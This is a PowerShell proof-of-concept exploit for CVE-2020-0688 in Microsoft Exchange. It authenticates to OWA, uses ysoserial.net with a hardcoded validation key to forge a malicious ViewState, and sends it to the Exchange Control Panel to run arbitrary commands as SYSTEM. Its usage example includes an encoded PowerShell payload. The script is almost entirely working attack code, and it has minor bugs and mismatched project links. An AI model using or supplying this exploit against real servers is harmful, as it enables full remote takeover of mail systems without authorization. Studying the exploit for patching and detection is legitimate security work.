function Invoke-PSForgot2kEyXCHANGE {
    <#
    .SYNOPSIS
    PoC for CVE-2020-0688 written in PowerShell.
    .DESCRIPTION
    PoC for CVE-2020-0688 written in PowerShell. Duo exchange server failing to properly create unique cryptographic keys at the time of installation
    all unpatched servers are using the same validationKey and decryptionKey which are used for the ViewState in Exchange Control Pannel.
    ViewState is server-side data that ASP.NET web applications store in serialized format on the client. 
    We will provide this data back, and something extra, to the server via the __VIEWSTATE request parameter.
    Duo the MSExchangeECPAppPool running under SYSTEM all of our 'custom' commands will also run under system.
    A Valid user is required to recieve and send back a ViewState!

    
    This function uses ysoserial.net to create the new ViewState which contains the command you specified on the -Command param.
    If you don't already have this installed on your system download it here https://github.com/pwntester/ysoserial.net

    .PARAMETER Server
    URI of the target Exchange Server.
    .PARAMETER User
    A Valid username/e-mail address
    .PARAMETER Password
    The password of the valid username/e-mail address
    .PARAMETER Command
    Command you want to execute on the target Exchange Server
    .PARAMETER YsoserialPath
    Path to the ysoserial.net executeable
    .PARAMETER VIEWSTATEGENERATOR
    The ViewStateGenerator. Is already set to the correct value of B97B4E27.
    .PARAMETER validationkey
    The validationkey. Is already set to the correct value of CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF
    .PARAMETER UserAgent
    The UserAgent PowerShell will use during the comnmincation to the target Exchange Server.
    .PARAMETER IgnoreSSL
    Ignore invalid SSL certificates.
    .LINK
    https://github.com/justin-p/PSDNSDumpsterAPI
    .EXAMPLE
    PS> Invoke-Forgot2kEyXCHANG -Server 'https://webmail.domain.tld' -User 'Steve.McGreeve@domain.tld' -Password 'Summer2020!' -Command 'cmd /c powershell.exe -en dwByAGkAdABlAC0AaABvAHMAdAAgACcASQAnAG0AIABhACAAcwB0AGkAbgBrAHkAIABzAGsAaQBkACAAdwBoAG8AIAByAHUAbgBzACAAcgBhAG4AZABvAG0AIABjAG8AZABlACAAOgApACcA=' -YsoserialPath 'C:\tools\ysoserial.net\ysoserial.exe'
    [+] Login successfully!
    [+] Generated new ViewState successfully!
    [+] Got a 500 response, successfully pwned https://webmail.domain.tld !
    .NOTES
    Author: Justin Perdok, https://justin-p.me
    Project: https://github.com/justin-p/PSDNSDumpsterAPI
    #>    
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory)]
        [String]$Server,
        [Parameter(Mandatory)]
        [String]$User,
        [Parameter(Mandatory)]
        [String]$Password,
        [Parameter(Mandatory)]
        [String]$Command,
        [Parameter(Mandatory)]
        [string]$YsoserialPath,
        [String]$VIEWSTATEGENERATOR = 'B97B4E27',
        [string]$validationkey = 'CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF',
        [String]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; CVE-2020-0688) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36",
        [Switch]$IgnoreSSL
    )
    Begin {
        Try {
            $FunctionName = $MyInvocation.MyCommand.Name
            Write-Verbose "$($FunctionName) - Begin."      
            if ($IgnoreSSL) {
                Write-Verbose 'Disabling certificate valiation'
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
            }
            $AuthURL = "$Server/owa/auth.owa"
            if ($([System.Uri]$AuthURL).Scheme -notmatch 'http|https'){
                Write-Error " $Server is not a valid url. Please use the following format `'http://host/`' or `'https://host/`'"
            }
            $postData = "flags=4&password=$Password&destination=$([uri]::EscapeDataString("$Server/ecp/"))&passwordText=&isUtf8=1&username=$username&forcedownlevel=0"
            if (!(Test-Path $YsoserialPath)) {
                Write-Error 'Could not find path to Ysoserial.exe' -ErrorAction Stop
                if ($(Get-Item $YsoserialPath).Extension -ne '.exe') {
                    Write-Error 'Could not find path to Ysoserial.exe' -ErrorAction Stop
                }
            }
        } Catch {
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }
    }
    Process {
        Write-Verbose "$($FunctionName) - Process."
        Try {
            Try {
                $LoginRequest = Invoke-Webrequest -uri $AuthURL -Method Post -Body $postData -UserAgent $UserAgent -SessionVariable ExchangeSession
                If ($(($LoginRequest.BaseResponse.ResponseUri.LocalPath).ToString()) -eq '/owa/auth/logon.aspx') {
                    Write-Error "Error logging in" -ErrorAction Stop
                }
                Else {
                    Write-Output "[+] Login successfully!"
                    $ASPdotNET_SessionID = $($ExchangeSession.Cookies.GetCookies($AuthURL) | Where-Object { $_.name -eq 'ASP.NET_SessionID' }).Value
                }
                Try {
                    Write-Verbose "-p ViewState -g TextFormattingRunProperties -c `"$Command`" --validationalg=`"SHA1`" --validationkey=`"$validationkey`" --generator=`"$VIEWSTATEGENERATOR`" --viewstateuserkey=`"$ASPdotNET_SessionID`" --isdebug –-islegacy"
                    $result = & $YsoserialPath -p ViewState -g TextFormattingRunProperties -c `"$Command`" --validationalg=`"SHA1`" --validationkey=`"$validationkey`" --generator=`"$VIEWSTATEGENERATOR`" --viewstateuserkey=`"$ASPdotNET_SessionID`" --isdebug –-islegacy 2>&1 | Out-String
                    $VIEWSTATE = ($result.Trim() -split "`n")[4]
                    if (!($VIEWSTATE -match "^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$")) {
                        Write-Error "Error generating ViewState" -ErrorAction Stop
                    }
                    Write-Output "[+] Generated new ViewState successfully!"
                }
                Catch {
                    Write-Error $PSItem
                }
                Try {
                    $ExploitRequest = Invoke-Webrequest -uri "$Server/ecp/default.aspx?__VIEWSTATEGENERATOR=$VIEWSTATEGENERATOR&__VIEWSTATE=$([System.Web.HttpUtility]::UrlEncode($VIEWSTATE))" -WebSession $ExchangeSession -ErrorAction Continue
                    if ($ExploitRequest.StatusCode -ne '500') {
                        Write-Error "status code is $($request.StatusCode), exploit failed" -ErrorAction Stop
                    }
                }
                Catch {
                    $500 = $true
                }         
            }
            Catch {
                Write-Error $PSItem
            }
        }
        Catch {
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }
    }
    End {
        Write-Verbose "$($FunctionName) - End."
        if ($500) {
            Write-Output "[+] Got a 500 response, successfully pwned $Server !"
        }
    }
}
